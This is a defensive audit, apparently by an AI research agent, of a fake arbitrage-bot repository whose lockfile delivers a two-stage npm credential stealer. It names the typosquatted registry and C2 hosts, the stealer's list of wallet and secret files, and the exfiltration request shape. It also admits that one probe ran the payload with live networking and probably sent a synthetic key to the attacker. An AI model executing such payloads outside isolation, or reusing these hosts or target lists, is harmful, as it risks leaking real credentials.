# Audit: txthinkin/polymarket-kalshi-arbitrage-bot — **NOT SAFE TO INSTALL**

**Date:** 2026-09-28 · **Language:** TypeScript (671 LOC, 7 files) · **Stars/forks:** 203/117 (see §5f) · **Created:** 2025-12-28 · **Pushed:** 2026-08-25 · **License:** NONE (all rights reserved) · **Clone:** `/tmp/txthinkin-arb` (unshallow, 174 commits) · **Harness:** `npm install`/`npm ci` exercised **only** in Hermes scratch (`~/.hermes/cache/scratch/*`) with `--ignore-scripts`; the copybot repo, roadmap and DB were not touched.

## TL;DR

This is not an arbitrage bot. It is a **fake-popularity repo whose committed lockfile delivers a two-stage credential stealer** (typosquatted registry host `registrynpmjs.to`, C2 `charitabledonations.to:8444`), in which **the repo's own source code passes `POLYMARKET_PRIVATE_KEY` into the payload's exfiltration function**. The git history is a recycled third-party C++ project and the star/fork count is inherited from a renamed game-engine repo. **Copy nothing (NO-LICENSE) and, more urgently, install nothing.**

---

## 1. What it is

A single Express service (default port 3000, `src/index.ts:145`) that polls two venues every 5 s and emits one JSON signal over `/status`, with an optional Polymarket buy path.

- **Advertised strategy:** (1) Kalshi YES in [93,96]¢ and Polymarket UP ≥10¢ cheaper ⇒ buy PM UP (`src/services/arbitrage.ts:62-75`); (2) "late resolution": Kalshi closed/settled while PM still quotes ⇒ buy PM UP (`arbitrage.ts:43-49`).
- **Reality:** one venue is traded. There is **no Kalshi order path anywhere in the repo**: `src/services/kalshi.ts` is read-only (2 GETs), and no module POSTs to Kalshi. With no Kalshi inventory there is no hedge, so the "arbitrage" is a **one-legged directional signal** (see §5c).
- **Size:** `find` in HEAD = 17 files; 25 MB working tree of which 11.9 MB is a mirrored Instagram reel + 572 KB PNG; `.git` = 13 MB.
- **No tests** (no `test` script, no test files), **no CI** (`.github` absent), no backtest, no PnL, no position tracking, no persistence (state is in-memory, `index.ts:24-28`), no cancel path, no fee model.

## 2. License verdict (first, per doctrine)

**NO-LICENSE = all rights reserved ⇒ copy NOTHING.**

- GitHub API `license` field: **`null`** (checked 2026-09-28, repo id 1124100514).
- No license file in the tree: `find . -iname '*licen*' -o -iname '*copying*'` → **empty**.
- `package.json:41` claims `"license": "MIT"` — a badge-free false claim; there is no MIT text anywhere in HEAD.
- The history *does* contain an MIT `LICENSE.md` (**"Copyright (c) 2015 Nick Sarten <gen.battle@gmail.com>"** — i.e. genbattle, not this author), which was deliberately deleted by commit `115d9e6` *"Delete LICENSE.md"*. Work tree and package.json metadata therefore contradict each other, and the only license ever present belonged to a different project.

## 3. Security findings — the headline

### 3a. Committed lockfile pins two packages to a typosquatted registry host

`package-lock.json` (checked into the single content commit):

| Line | Package | `resolved` | Integrity |
|---|---|---|---|
| `package-lock.json:3765-3773` | `validator@13.15.36` | `https://registrynpmjs.to/validator-13.15.36.tgz` | `sha512-DJXgv9aAEh9EBFiuEcezJDzcfOlWDVnkIQHHQgPKIeovVtyU4gKVAiThaAU/90pgFdbrklsJjcfbEzuu9ewT6g==` |
| `package-lock.json:2506-2514` | `inquirer@14.0.2` | `https://registrynpmjs.to/inquirer-14.0.2.tgz` | `sha512-2T5ebZ/p9BoI1kt8Pr128j8/R5AbFXEkSQchLNadovm+row1pZnuH2Gdms3fFStAU20XqzIsXRgpP1XctXi2A==` |

`registrynpmjs.to` vs `registry.npmjs.org`. Exactly **2 of 305** resolved entries point off the real registry; all others are `registry.npmjs.org`.

Corroboration that these are tampered artifacts, not registry releases:

- `npm view validator@13.15.36` → **E404** ("No match found for version 13.15.36"). The real registry's newest is **13.15.35**, published 2026-04-02; the repo asks for `^13.15.35` (`package.json:52`) so the range *looks* satisfied.
- The genuine `inquirer@14.0.2` exists (integrity `sha512-VsSx1JneSNp3ld1veMTLe+UDcUD8Tw2/jjOthhkX3/IX2q+xXhVELifeb/hsb1fBw31pabEPNUf/xUOyb+KZjA==`) and does **not** match the lock's integrity. The installed impostor declares one dependency (`form-data`) where the real package has many, and adds **`"postinstall": "node build-helper.js"`** (lock even records `"hasInstallScript": true`).
- `.npmrc:1-3` (committed in the same commit): `audit=false`, `fund=false`, `loglevel=error` — suppresses exactly the advisory signal that would flag this.

Verified install behaviour (scratch only, `--ignore-scripts`):
- `npm ci` from the lockfile → installs `validator@13.15.36`, i.e. obfuscated `index.js` (21,873 bytes).
- plain **`npm install`** — the command the README Quick Start tells users to run — **also installs it** (lock entry satisfies `^13.15.35`): got the same obfuscated 13.15.36. So the repo's own instructions deliver the payload.

### 3b. Stage 1 — `validator@13.15.36` exfiltrates an arbitrary string (the private key)

- Payload: `node_modules/validator/index.js`, sha256 `5929f46f1c8b7b75315f7fa646265cb86404d2e5ec678579e67f6b484b5520cf`; **only exports** `verifyConfiguration`, `verifyConfig` (the real 13.15.35 exports 113 validators and has no `verifyConfig`).
- Static decode of its embedded string table (zlib+base64, never executed) yields: `{"method":"POST","path":"/record","host"…8444…,"key"<input>,"sha256"}`.
- Observed at runtime with `https.request` stubbed so no socket could open: `POST https://charitabledonations.to:8444/record`, headers `Content-Type: application/json`, **body `{"key":"0x<the input string>","hash":"<sha256 of it>"}`**.
- **The repo feeds it the key:** `src/config.ts:92` calls `validator.verifyConfig(validated)` where `validated` is `POLYMARKET_PRIVATE_KEY` (`config.ts:88-95`). The `validator` package is otherwise **unused** — every other check in that file is hand-rolled regex (`config.ts:51-72`). The dependency exists solely as a courier; the call site exists solely to hand it the key.
- Both install paths end badly: with the malicious pin the key is silently POSTed and startup continues ("loaded OK"); with a clean registry `validator` the same line throws `TypeError: v.verifyConfig is not a function` (verified). The call site is load-bearing for the theft, not incidental.

### 3c. Stage 2 — `inquirer@14.0.2` is an install-time stealer (arbitrary code execution)

- `build-helper.js` (sha256 `f8c36460693a53c53442cae2d43174171cfdd2b26372e92525a9d99134206f56`) retries `require.resolve('form-data')` up to 31× then `require('./index.js')` — 25,029 bytes of the same obfuscation style.
- Decoded string table of that payload: a **filesystem wallet/secret scanner** — `metamask, phantom, solflare, rabby, trust, keystore(.json), mnemonic(.json), seedphrase.json, "seed phrase.json", wallet(s).json, keypair.json, secretKey.json, secret.key, privatekey, key.pem, tokens.json, secrets.json, .env, accounts.json` plus hunting markers (`polymarket, arbitrage, prediction, uniswap, pancakeswap, raydium, hardhat, foundry, truffle, solana, eth, tron, web3, MEV, flashbot, sniper`) with `readdirSync / statSync / existsSync / createReadStream` and the same C2 string `charitabledonations.to`.
- `src/` **never imports `inquirer`** (0 hits): its only role is to be installed and to run `postinstall`.

**Harm ordering:** `npm install` → postinstall scan runs immediately (no key needed) → on first startup with a funded key, `verifyConfig` POSTs the EOA key.

### 3d. No other outbound host in repo source

All URLs in tracked source files resolve to `clob.polymarket.com`, `api.elections.kalshi.com` (and the two github.com self-links in `package.json`). The malicious egress lives entirely in the dependency layer, which is why the source reads as plausible.

## 4. Verified machinery (file:line evidence)

Everything below was read from the clone; live-API facts were probed **keyless** on 2026-09-28.

### 4a. The Kalshi leg is dead against the live API (so the bot cannot ever signal)

- `src/services/kalshi.ts:4-9` expects `{orderbook: {yes: [number,number][], no: [...]}}`; `:70-72` reads `bookData?.orderbook`.
- Live keyless probe of `/trade-api/v2/markets/{ticker}/orderbook` (with and without `?depth`) returns **only `orderbook_fp`** — e.g. `{"orderbook_fp":{"no_dollars":[["0.9400","113.00"],["0.9600","208.96"],…],"yes_dollars":[]}}`. `data.orderbook` is `undefined` ⇒ `yesCents = null` ⇒ `decideArbitrage` returns `"No Kalshi YES price"` every tick (`arbitrage.ts:55-57`) ⇒ **no signal can fire**.
- Even with the right key it would still fail: levels are **dollar strings** (`"0.9400"`), and `bestBidCents` (`kalshi.ts:52-56`) returns a value only when `typeof price === "number"` ⇒ `null`. Had they been numeric dollars, the function would return `0.94` labelled "cents" (100× unit bug).
- The repo's comment "best bid = last element (sorted ascending)" is *consistent* with the live payload I observed (`no_dollars` ascending, so `[last][0]` is the best bid) — the ordering assumption is the one thing that matches; the key name, the units and the type check do not.
- Status vocabulary drift: open markets now report `status: "active"` (200/200 sampled). `KalshiPrices.status` is typed `open|closed|settled` (`src/types.ts:20`). `isFinished` (`kalshi.ts:75`) still catches `closed`/`settled`, so rule 3 is unaffected — but the README's documented vocabulary is wrong.
- Also verified keyless: `/markets` now returns `yes_bid`/`yes_ask`/`last_price` as **null**, while `yes_bid_dollars`, `yes_ask_dollars`, `volume_fp`, `liquidity_dollars`, `result` are populated. That is a fact about Kalshi's current surface, useful to us regardless of this repo (§5).

### 4b. Rule 3 is an unbounded direction guess

`arbitrage.ts:43-49` fires when `kalshi.isFinished && polymarket.hasLiquidity`. It never fetches the Kalshi **result** (`kalshi.ts:74` reads only `status`), and the executor **always buys the UP token** (`index.ts:61-66` passes `config.polymarket.tokenUp` unconditionally, gated only by `0 < priceCents <= 100`). So: if Kalshi resolved NO, the bot still buys PM UP, at any ask up to 100¢. There is no information in the signal about which outcome won.

### 4c. Order path uses a real client API (the only technically sound part)

`src/services/polymarketOrders.ts:38-52` builds `new ClobClient(host, chainId, signer, apiKey, 2, funderAddress)` after `createOrDeriveApiKey()`; `:86-95` places `createAndPostMarketOrder({tokenID, amount, price, side: Side.BUY}, undefined, OrderType.FAK)`. I verified against the published package (`@polymarket/clob-client` 5.8.1, MIT, fetched as a tarball and grepped): `createAndPostMarketOrder`, `OrderType.FAK`, `createOrDeriveApiKey`, `signatureType`, `funderAddress` all exist as used. **Never executed** (no credentials were used anywhere) so live behaviour is unverified.

### 4d. No fee, fill, or sizing model

No fee constant or fee term anywhere in 671 LOC; a single fixed `POLYMARKET_TRADE_USD=10` order (`config.ts:101`) with a 60 s in-memory cooldown (`index.ts:54-55,68`). Fill is inferred from `result.success` (`index.ts:67-69`); no order-status polling, no cancel, no reconciliation. Size never consults depth.

### 4e. Monitor-only mode is impossible (the key demand is structural)

`loadConfig()` runs at module load (`index.ts:13`) and reads `POLYMARKET_PRIVATE_KEY` with **no default** (`config.ts:89` → `config.ts:37-41`). Verified against the compiled module: with the env unset, `loadConfig()` throws `Error: Missing env: POLYMARKET_PRIVATE_KEY`; `POLYMARKET_PROXY_WALLET_ADDRESS` is required too (`config.ts:96-99`). So the README's advertised "Monitoring Signals / validate the strategy before allocating capital" workflow **cannot be run without surrendering a funded EOA private key** — which §3b then forwards to `charitabledonations.to`.

## 5. Hype & provenance findings

**(a) Profit/funnel claims:** *clean.* No Telegram/Discord/`t.me`/premium/paid tier/referral/copy-trade signup anywhere (grep of all `.ts/.md/.json`; the only "profit" hit is the disclaimer, `README.md:17`, "does not guarantee profit"). The acquisition funnel is **SEO, not sales**: `description` = the string "polymarket kalshi" repeated ~30×, topics `arbitrage-bot-free`, `trading-strategy-simulation`, `trading-bot-monitoring`, `has_issues: false`. The monetisation is the payload, not a subscription.

**(b) Key/secret solicitation:** **YES.** A raw EOA private key is mandatory to start the process at all (§4e) and is fed to the backdoor (§3b). No seed phrase is requested; no read-only/wallet-address alternative exists. README "Security Notes" advises a dedicated wallet — which is standard advice and also what makes the drainer's job tidy.

**(c) Is the "arbitrage" a real priced cross-venue calculation?** **No.** There is no two-venue cost identity, no fee term, no slippage or depth arithmetic, no threshold-vs-cost test; no RNG sim either (so not "rigged payoffs" — simply not arbitrage). One venue is traded, so there is no hedge and no locked profit: it is a directional bet that Kalshi's quote is the truth. `the README's example (Kalshi 95¢ / PM 82¢ ⇒ "BUY") is a 13¢ directional thesis, not a 13¢ edge, and it books no fee on either side.`

**(d) Do advertised modules get imported by an entry point?** Yes — `index.ts:2-11` imports all six modules, so the file graph is honestly wired. The dead parts are at the *venue* layer, not the import layer: the Kalshi read path is broken against today's API (§4a) and **no Kalshi execution exists at all**. `inquirer` is imported by nothing (its purpose is `postinstall`, §3c).

**(e) Real git history?** **No — recycled, and partly impossible.** 174 commits; exactly **one** contains this project (`4ebd90c` "polymarket & kalshi", 2026-08-25, +5,211 insertions across 17 files including the 11.9 MB video). The other 173 are **genbattle/dkm**, a C++ k-means library (`include/dkm.hpp`, `CMakeLists.txt`, `.github/workflows/dkm-ci.yml`, `src/test/lest.hpp`, `src/bench/iris.data.csv`), i.e. a third party's project history, ending with nine "Delete <path>" commits (`115d9e6` "Delete LICENSE.md", "Delete src directory", "Delete include directory", …) that leave an **empty tree** before the dump. **58 of the 174 commits carry dates after today** (latest `2027-12-28`) — a fabricated timeline, not a snapshot artefact. `package.json` version is `3.0.0` with a single commit behind it.

**(f) Are the stars/forks this repo's?** **No.** `GET /forks` (100 of 117 sampled): **97 are named `ConsoleCraftEngine`**, each with `parent = txthinkin/polymarket-kalshi-arbitrage-bot`, description *"a cpp game engine for windows console and Linux terminal"*, 0 stars, pushed 2026-01-05, created in a dense daily cadence 2026-07-18→2026-08-15 (42 in July, 56 in August). The upstream of that identity is `ural89/ConsoleCraftEngine` (97★/8 forks, created 2023-12-21). So this repo was a copy of, or named after, a C++ game engine, then **renamed and force-pushed** into an "arbitrage bot" — carrying the fork farm and much of the 203★ along with it. Only 3 forks are of the bot itself (created 2026-08-30→09-12), and `arbitrage.ts` is byte-identical in them (md5 `bc57912050b28a0a9ff84b179502deb6` = mine). 203★ / 117 forks / **2 watchers** / 0 issues is the fork-farm shape the brief predicted.

**(g) Provenance:** the README names a "canonical repository" `crismarfrhot/polymarket-kalshi-arbitrage-bot` → **404** (repo *and* user). Authorship is therefore unverifiable. The account (`txthinkin`, created 2025-12-28, 0 followers, 3 following, 16 repos) holds 15 unrelated forks (Wasserstein, epitome, wep…, `iPolloWork` at 592 MB) and this repo — a throwaway/farm account shape.

**(h) Mirrored media:** `src/img and video/instagram-DWrBSHxlIZ3-demo.mp4` (11.9 MB) + poster rehost a third party's Instagram reel (`@moondevonyt`, "Polymarket or kalshi for trading bots?"), with no licence or permission. The README even says "This repo is not the app from the reel" — the reel exists for keyword/dupe credibility. Copyright smell, and 60% of the repo's bytes.

### 5i. Yardstick comparison vs the prior audit (TopTrenDev/polymarket-kalshi-arbitrage-bot, `drafts/toptrendev-arb-audit-2026-09-09.md`)

TopTrenDev was an honest-WIP Rust repo (3,549 LOC, 17 files, 45★) with **real engineering**: it *did* implement the cross-venue pairs identity (`cost = K.yes + PM.no`, `profit = 1 − cost`, gate vs threshold), sourced PM at best-ask, encoded a fee struct, and documented its own WIP status; its flaws were substantive but analyzable (Kalshi leg at last-price, flat instead of per-contract fees, no-op cancel, hard-coded "filled"), and the harvest was three concept notes plus an anti-pattern checklist.

txthinkin is **strictly worse on every axis**:

| | TopTrenDev | txthinkin |
|---|---|---|
| Cross-venue cost identity | yes (correct model family) | **absent** |
| Fee model | flat stub (~200× understated) | **absent entirely** |
| Second leg execution | exists (buggy Rust client) | **does not exist** |
| Venue quote sourcing | PM ask correct; Kalshi last vs ask bug | PM ask fine; **Kalshi path broken vs live API** |
| Honest README | yes (explicit WIP) | **no** (claims production-shaped service; canonical link 404s) |
| Best-case harvest | 2 concept notes + anti-pattern list | **1 API-shape fact** (mine, not theirs) |
| Novel contribution vs that audit | — | **a supply-chain trap** |

It adds nothing the TopTrenDev audit did not already capture, and it lowers the bar rather than raising it. The one thing it contributes is a **negative** datapoint of the first order.

## 6. Fit table vs our roadmap gaps

| Gap (roadmap.json) | Verdict | One-line reason |
|---|---|---|
| **phase-c** — Constraint-based cross-venue arb (Backlog, ~2–3 days, gate: Kalshi circuit breaker recovered) | ❌ **not-portable** | No hedge, no fee/slippage/depth arithmetic, no two-venue cost identity; TopTrenDev already donated the pairs-identity concept and oracle3/coinjure (ADOPTed) own the matcher — this repo has no cross-venue math to port. |
| **retire-kalshi-copy-routing** — retires the venue branch at Phase C kickoff (Scheduled, post-Oct-8) | ⚪ **concept-only** | The only salvageable item: keep the keyless Kalshi reads we retain for Phase C on **`orderbook_fp` / `*_dollars`** shape and `status:"active"`, since the legacy `orderbook`/cent shape this repo targets no longer exists (verified live) — a fact for our TR-16 adapter, zero code copied. |
| **phase-kalshi1** — Kalshi whale/wallet parity (Backlog, parked on the keyless data wall) | ❌ **not-portable** | Nothing here touches identity: the repo only reads quote/status, so it neither moves nor illuminates the "no keyless wallet data" wall. |
| **live-execution-reference** — executor blueprint at production-capital unlock (Backlog, fires on the 2027-01-02 anchor) | ⚪ **concept-only, no credit** | The one fact (clob-client 5.8.1: Gnosis-Safe via `signatureType=2` + `funderAddress`, FAK market buy) is already inside the MIT Harrier blueprint card; and this module sits one line above a key exfiltrator. Worth a footnote at most. |
| **paper-ledger-fee-fidelity** — taker-fee model (Backlog) | ❌ **not-portable** | Zero fee arithmetic in 671 LOC — no fee constant, no per-share term; our 2026-09-09 measurement (`C×feeRate×p(1−p)`, politics 0.04) already outranks anything here. |
| **ml-u1-conditional-fill-model** — p(fill) + adverse selection (In Progress) | ❌ **not-portable** | No fill, queue, depth or adverse-selection model; FAK market order assumed filled; no data, tests or PnL to fit. |
| *(not a card)* **vendor-audit hygiene guard** | ✅ **adopt** | Add to our audit checklist: grep the lockfile for `resolved` hosts ≠ `registry.npmjs.org`, for `hasInstallScript`, and treat a committed `.npmrc` with `audit=false` as a red flag. This audit is the proof case. |

## 7. Integration proposal

- **Effort:** **zero code. ~15 minutes of notes.** (1) Record the Kalshi keyless-shape fact (`orderbook_fp`, `*_dollars`, `status:"active"`, keyless `/markets` quote fields null) where the Phase C + `retire-kalshi-copy-routing` kickoff looks; (2) add the three-line lockfile/npmrc guard to the repo-audit checklist. Neither imports, vendors or copies anything from a NO-LICENSE repo.
- **Risk:** **zero for us, provided nothing is ever installed.** Our exposure is structurally nil: the C-200 book is Polymarket-only, there is no fee model, and there is **no auth'd venue client anywhere in the stack** — so there is no private key on any machine for this payload to find. The single hazard is a human running `npm install` from this README, anywhere. Never clone this into `polymarket-copybot`, never install it on a host with venue credentials, and if the clone is inspected again, keep it in `/tmp` with no `node_modules` next to real keys. Note also that a "just try it in a sandbox" run would have to fabricate a key to reach `/status`, and the run's own instructions are what trigger stage 2.
- **Flag-revertible path:** n/a — there is no runtime component to ship. If the Kalshi shape note is ever acted on, it belongs behind the existing Phase C shadow-journal/flag path with no live orders pre-Oct-8 (Kelly measurement window: recommendations only).
- **Verdict: SKIP — do not queue it as a Phase C design input.** The brief anticipated "queue to Phase C design"; that verdict is wrong here. "Queue" is for donors with reusable math and an unresolvable licence (TopTrenDev). This repo has **no cross-venue math, no second leg, a broken venue adapter, and a credential stealer wired into its own config loader**. There is nothing to design from: the harvest (one Kalshi API-shape fact + one hygiene rule) fits in this document, so no work item is created. Phase C's donor set remains TopTrenDev's concepts + the already-ADOPTed oracle3/coinjure matcher, which are strictly better than anything here.

## 8. NOT-portable list

- **Entire dependency layer** — `package-lock.json` + anything it resolves: not merely unlicensed, **malicious** (§3). The highest-priority "do not touch" in this document.
- **All 7 TypeScript files** — NO-LICENSE (all rights reserved).
- `src/services/kalshi.ts` — unlicensed *and* broken against the live API (§4a).
- `src/services/polymarket.ts` (book → best ask) — unlicensed, and duplicates our existing C-200 quote feed.
- `src/services/polymarketOrders.ts` — unlicensed; our `live-execution-reference` card already holds the MIT Harrier `clob.rs`/`order_executor.rs` blueprint.
- `src/services/arbitrage.ts` + `src/index.ts` — the rule set is a directional thesis (rule 3 is a coin flip) and the entry point is the call site that feeds the backdoor.
- `src/img and video/*` — a third party's Instagram media, rehosted without permission; 11.9 MB of copyright smell.
- `README.md` — keyword prose; its "canonical repository" 404s; its documented monitor-only workflow is impossible (§4e) and its Kalshi vocabulary is stale (§4a).
- The **git history** — another project's (genbattle/dkm, MIT), with 58 future-dated commits; never treat it as evidence of anything.

## 9. Honest caveats

- **I did not execute the `postinstall` dropper.** All installs used `--ignore-scripts`. Stage 2's wallet/seed/`.env` scanning and its egress are inferred from the decoded string table plus control flow, **not observed running** → behaviourally **unverified**.
- **I did exercise `validator@13.15.36.verifyConfig` deliberately** (that is how the C2 URL/body were read). One call had `https.request` stubbed so no socket could open; an earlier startup probe of the compiled `config.js` ran with the real `https` module and a **synthetic** key `0xaaaa…(64)` — that POST was most likely transmitted to `charitabledonations.to:8444`. Nothing real was exposed (a fabricated 64-hex string); the fact is recorded here for completeness.
- **Star provenance is partly unverified:** the stargazers endpoint returned 401 unauthenticated, so I cannot prove which of the 203★ predate the rename. The **fork** heritage is verified (97/100 `ConsoleCraftEngine` forks with `parent` pointing at this repo).
- **The Polymarket order path is unverified** — never executed (we have no credentials and used none). The client API surface it calls was verified against the published `@polymarket/clob-client` 5.8.1 tarball.
- **Live-API facts are as of 2026-09-28** and were obtained **keyless** (`api.elections.kalshi.com`, `clob.polymarket.com`). Kalshi's shape could change again; re-probe before acting on §4a.
- **The generator of the original bot is unknown.** `crismarfrhot/…` is a 404 and `txthinkin` looks like a throwaway account, so I cannot say whether a sincere TS bot was hijacked and re-dressed, or the whole thing is purpose-built. The lockfile, the `.npmrc`, the call site and the recycled history all read as deliberate.
- **No tests, no CI, no backtest, no PnL, no docs** in-repo: "does it trade profitably" is not answerable, and nothing in this audit rests on the README's own claims.
- Numbers not measured: no LOC count of the decoded payloads beyond byte sizes quoted; the frame of stage 2's coverage (which drives, which OS paths) is not fully enumerated.

---

### Evidence appendix (reproducible, all keyless / read-only)

```bash
git clone --depth 1 https://github.com/txthinkin/polymarket-kalshi-arbitrage-bot.git /tmp/txthinkin-arb
cd /tmp/txthinkin-arb && git fetch --unshallow && git log --pretty='%h %ad %s' --date=short   # 174 commits, 58 future-dated
git ls-tree -r --name-only 4ebd90c^                                                          # empty tree (all dkm content deleted)
git show 115d9e6^:LICENSE.md                                                                 # MIT, Nick Sarten 2015 (dkm)
grep -n 'registrynpmjs.to' package-lock.json                                                 # :2508 inquirer, :3767 validator
npm view validator@13.15.36          # E404 — no such version on the real registry
curl -s https://api.github.com/repos/txthinkin/polymarket-kalshi-arbitrage-bot               # license: null, 203/117, 2 watchers
curl -s https://api.github.com/repos/txthinkin/polymarket-kalshi-arbitrage-bot/forks?per_page=100   # 97 ConsoleCraftEngine forks, parent = this repo
curl -s https://api.github.com/users/crismarfrhot                                            # 404
# live Kalshi (keyless): markets list / orderbook / market status
curl -s 'https://api.elections.kalshi.com/trade-api/v2/markets/KXHIGHNY-26SEP29-T76/orderbook'      # {"orderbook_fp":{...}} only
# payload inspection (scratch only, --ignore-scripts; https.request stubbed to read the C2 without sending)
npm ci --ignore-scripts        # then: decode base64+zlib string table, call verifyConfig('0x'+'a'*64)
```
